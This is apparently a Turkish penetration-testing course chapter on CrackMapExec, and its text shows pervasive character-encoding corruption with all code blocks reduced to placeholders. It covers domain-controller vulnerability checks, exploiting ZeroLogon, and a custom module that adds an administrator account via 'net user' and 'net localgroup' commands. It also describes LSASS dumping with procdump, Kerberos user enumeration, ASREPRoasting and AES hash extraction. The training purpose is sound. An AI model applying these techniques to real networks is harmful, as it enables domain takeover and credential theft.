CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


